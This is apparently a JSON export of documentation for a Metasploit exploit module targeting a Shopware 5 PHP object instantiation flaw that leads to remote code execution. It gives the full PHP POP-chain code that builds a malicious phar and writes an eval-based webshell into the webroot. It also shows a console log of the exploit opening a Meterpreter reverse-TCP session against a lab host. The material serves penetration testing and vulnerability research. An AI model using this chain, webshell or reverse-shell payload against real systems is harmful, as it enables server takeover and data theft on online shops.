{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/http/shopware_createinstancefromnamedarguments_rce","result":{"data":{"moduleMetadataJson":{"id":"6eadce72-be7f-5464-af1b-22daba221c81","name":"Shopware createInstanceFromNamedArguments PHP Object Instantiation RCE","fullname":"exploit/multi/http/shopware_createinstancefromnamedarguments_rce","description":"This module exploits a php object instantiation vulnerability that can lead to RCE in\n        Shopware. An authenticated backend user could exploit the vulnerability.\n\n        The vulnerability exists in the createInstanceFromNamedArguments function, where the code\n        insufficiently performs whitelist check which can be bypassed to trigger an object injection.\n\n        An attacker can leverage this to deserialize an arbitrary payload and write a webshell to\n        the target system, resulting in remote code execution.\n\n        Tested on Shopware git branches 5.6, 5.5, 5.4, 5.3.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/http/shopware_createinstancefromnamedarguments_rce","documentationSlug":"/modules/documentation/exploit/multi/http/shopware_createinstancefromnamedarguments_rce","referencesSlug":"/modules/references/exploit/multi/http/shopware_createinstancefromnamedarguments_rce"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>Shopware 5 is the next generation of open source e-commerce software made in Germany. Based on bleeding edge technologies like Symfony 3, Doctrine 2 &#x26; Zend Framework Shopware comes as the perfect platform for your next e-commerce project. Furthermore Shopware 5 provides an event-driven plugin system and an advanced hook system, giving you the ability to customize every part of the platform..</p>\n<p>In the createInstanceFromNamedArguments method, a PHP object instantiation vulnerability was discovered by <a href=\"https://twitter.com/KarimOuerghemmi\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">@KarimOuerghemmi</a> of RIPS who rated the bug as a CVSS 3.6 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N) due to the ability of leveraging an XXE primitive. Later on, I bypassed the whitelist patch and found an RCE primitive via PHP object injection. Note that authentication is required to exploit this vulnerability.</p>\n<p>This vulnerability is a bypass for CVE-2017-18357 and was tested on Shopware git branches 5.6, 5.5, 5.4, 5.3.</p>\n<p>The following is the exact setup I used to test and analyze the vulnerability:</p>\n<ul>\n<li>Debian GNU/Linux 9 (stretch) x64</li>\n<li>MariaDB latest</li>\n<li>Apache2 w/ mod rewrite / PHP 7.2.15 w/ zip, gd, ctype, curl, dom, hash, iconv, json, session, mbstring, simplexml, xml, pdo_mysql and fileinfo</li>\n</ul>\n<p>For installation instructions, please refer to the <a href=\"https://github.com/shopware/shopware#installation-via-git\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Shopware installation guide</a>.</p>\n<h3 id=\"notes\" style=\"position:relative;\"><a href=\"#notes\" aria-label=\"notes permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Notes</h3>\n<p>The recommended CVSS score is 7.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N).</p>\n<h3 id=\"pop-chain\" style=\"position:relative;\"><a href=\"#pop-chain\" aria-label=\"pop chain permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>POP Chain</h3>\n<p>In order to pivot from an object instantiation bug to a object injection primitive, we need something worth while deserializing:</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-php line-numbers\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">namespace</span> <span class=\"token package\">GuzzleHttp<span class=\"token punctuation\">\\</span>Cookie</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// pop chain</span>\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">ToArrayInterface</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">SetCookie</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">ToArrayInterface</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">array</span> <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">CookieJar</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">ToArrayInterface</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$cookies</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">setCookie</span><span class=\"token punctuation\">(</span>SetCookie <span class=\"token variable\">$cookie</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">cookies</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cookie</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">FileCookieJar</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">CookieJar</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$filename</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$bd_file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">filename</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$bd_file</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">setCookie</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">SetCookie</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span>\n            <span class=\"token double-quoted-string string\">\"Value\"</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token single-quoted-string string\">'&lt;?php eval(base64_decode($_SERVER[HTTP_SI])); ?>'</span><span class=\"token punctuation\">,</span>\n            <span class=\"token double-quoted-string string\">\"Expires\"</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token boolean constant\">true</span><span class=\"token punctuation\">,</span>\n            <span class=\"token double-quoted-string string\">\"Discard\"</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token boolean constant\">false</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token variable\">$phar</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\"><span class=\"token punctuation\">\\</span>Phar</span><span class=\"token punctuation\">(</span><span class=\"token single-quoted-string string\">'poc.phar'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">startBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">addFromString</span><span class=\"token punctuation\">(</span><span class=\"token single-quoted-string string\">'test.txt'</span><span class=\"token punctuation\">,</span> <span class=\"token single-quoted-string string\">'test'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">setStub</span><span class=\"token punctuation\">(</span><span class=\"token single-quoted-string string\">'&lt;?php __HALT_COMPILER(); ? >'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$o</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FileCookieJar</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"/var/www/html/media/image/si.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">setMetadata</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$o</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">stopBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">saturn:metasploit-framework mr_me$ ./msfconsole -qr scripts/shopware.rc \n[*] Processing scripts/shopware.rc for ERB directives.\nresource (scripts/shopware.rc)&gt; use exploit/multi/http/shopware_createinstancefromnamedarguments_rce\nresource (scripts/shopware.rc)&gt; set payload php/meterpreter/reverse_tcp\npayload =&gt; php/meterpreter/reverse_tcp\nresource (scripts/shopware.rc)&gt; set LHOST 192.168.23.1\nLHOST =&gt; 192.168.23.1\nresource (scripts/shopware.rc)&gt; set RHOSTS 192.168.23.164\nRHOSTS =&gt; 192.168.23.164\nresource (scripts/shopware.rc)&gt; set RPORT 8080\nRPORT =&gt; 8080\nresource (scripts/shopware.rc)&gt; check\n[+] 192.168.23.164:8080 - The target is vulnerable.\nresource (scripts/shopware.rc)&gt; exploit\n[*] Started reverse TCP handler on 192.168.23.1:4444 \n[+] Stage 1 - logged in with demo: SHOPWAREBACKEND=lpmck6d7nrh23ki2fsgeopci3p;\n[+] Stage 2 - leaked the webroot: /var/www/html\n[+] Stage 3 - leaked the CSRF token: SRJELMCxJfEr2RiMlqS8xmOdidI5Hr\n[+] Stage 4 - generated our phar\n[+] Stage 5 - uploaded phar\n[+] Stage 6 - leaked phar location: media/image/6b/7e/0c/eiuzuoii.jpg\n[+] Stage 7 - triggered object instantiation!\n[*] Sending stage (38247 bytes) to 192.168.23.174\n[*] Meterpreter session 1 opened (192.168.23.1:4444 -&gt; 192.168.23.174:34190) at 2019-05-09 21:11:50 -0500\n[+] Deleted rguktpcw.php\n[+] Deleted image/6b/7e/0c/eiuzuoii.jpg\n\nmeterpreter &gt; sysinfo\nComputer    : 45835d649528\nOS          : Linux 45835d649528 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64\nMeterpreter : php/linux\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"6eadce72-be7f-5464-af1b-22daba221c81"}}}